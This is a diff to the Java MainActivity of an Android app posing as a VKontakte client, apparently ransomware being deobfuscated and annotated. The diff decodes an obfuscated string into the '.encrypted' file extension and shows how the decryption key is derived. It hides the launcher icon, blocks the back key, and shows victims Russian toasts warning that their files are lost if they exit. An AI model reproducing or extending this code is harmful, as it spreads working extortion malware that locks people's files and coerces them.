@@ -1,5 +1,20 @@
+/*
+ * Copyright (C) 2018 Тимашков Иван
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
 package com.android.vkontakte;
-//Строка 82
+
 import android.content.ComponentName;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -15,7 +30,14 @@ import java.io.File;
 
 import static android.widget.Toast.LENGTH_LONG;
 
+//##################################################################
+/**
+ * @since 21.09.2018
+ * @author Тимашков Иван
+ * @author https://github.com/TimScriptov
+ */
 public class MainActivity extends AppCompatActivity
+//##################################################################
 	{
 
 		public static MainActivity instance;
@@ -28,24 +50,28 @@ public class MainActivity extends AppCompatActivity
 		ComponentName secondComponentName;
 		PackageManager packageManager;
 		String randomNumber;
-
+//===================================================================
 		private void disableComponent ( ComponentName componentName )
+//===================================================================
 			{
 				packageManager.setComponentEnabledSetting ( componentName, 2, 1 );
-			}
-
+			}//disableComponent
+//===================================================================
 		private void enabledComponent ( ComponentName componentName )
+//===================================================================
 			{
 				packageManager.setComponentEnabledSetting ( componentName, 1, 1 );
-			}
-
+			}//enableComponent
+//===================================================================
 		private void setIconSc ( )
+//===================================================================
 			{
 				disableComponent ( this.firstComponentName );
 				enabledComponent ( this.secondComponentName );
-			}
-
+			}//setIconSc
+//===================================================================
 		@Override protected void onCreate ( Bundle bundle )
+//===================================================================
 			{
 				getWindow ( ).addFlags ( WindowManager.LayoutParams.FLAG_FULLSCREEN );
 				packageManager = getApplicationContext ( ).getPackageManager ( );
@@ -75,11 +101,10 @@ public class MainActivity extends AppCompatActivity
 					{
 						randomNumber = sharedPreferences.getString ( "bah", BuildConfig.VERSION_NAME );
 					}
-
-				hz = Utils.l (
-					"\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17d5\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17d6\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17da\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9" )
+				//Расширение зашифрованного файла
+				hz = ( ".encrypted" )
 					+ randomNumber;
-				decryptKey = BuildConfig.VERSION_NAME + ( Integer.parseInt ( this.randomNumber ) + 520 );
+				decryptKey = BuildConfig.VERSION_NAME + ( Integer.parseInt ( this.randomNumber ) + 520 );//Ключ расшифровки
 				hzs = hz.length ( );
 				externalStorageDirectory =
 					new File ( String.valueOf ( Environment.getExternalStorageDirectory ( ) ) + "/" );
@@ -110,23 +135,25 @@ public class MainActivity extends AppCompatActivity
 					.commit ( );
 				Utils.bz ( this );
 				setIconSc ( );
-			}
-
+			}//onCreate
+//===================================================================
 		@Override
 		public boolean onKeyDown ( int keyCode, KeyEvent keyEvent )
+//===================================================================
 			{
 				if ( keyCode == KeyEvent.KEYCODE_BACK )
 					{
 						Toast.makeText ( this, ( getSupportFragmentManager ( ).findFragmentById (
 											R.id.frame_content ) ) instanceof EncryptFragment
-										? "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01"
+										? "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!"
 										: "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!", LENGTH_LONG )
 							.show ( );
 					}
 				return true;
-			}
-
+			}//onKeyDown
+//===================================================================
 		@Override protected void onPause ( )
+//===================================================================
 			{
 				if ( getSupportFragmentManager ( ).findFragmentById (
 						R.id.frame_content ) instanceof EncryptFragment )
@@ -136,7 +163,7 @@ public class MainActivity extends AppCompatActivity
 						edit.putInt ( "cs", sharedPreferences.getInt ( "cs", 0 ) + 1 );
 						edit.commit ( );
 
-						Toast.makeText ( this, "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01",
+						Toast.makeText ( this, "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!",
 										LENGTH_LONG ).show ( );
 					}
 				else
@@ -146,9 +173,10 @@ public class MainActivity extends AppCompatActivity
 					}
 
 				super.onPause ( );
-			}
-
+			}//onPause
+//===================================================================
 		@Override protected void onResume ( )
+//===================================================================
 			{
 				if ( ( getSupportFragmentManager ( ).findFragmentById (
 						R.id.frame_content ) instanceof EncryptFragment )
@@ -161,5 +189,7 @@ public class MainActivity extends AppCompatActivity
 					}
 
 				super.onResume ( );
-			}
-	}
+			}//onResume
+//===================================================================
+	}//MainActivity
+//##################################################################
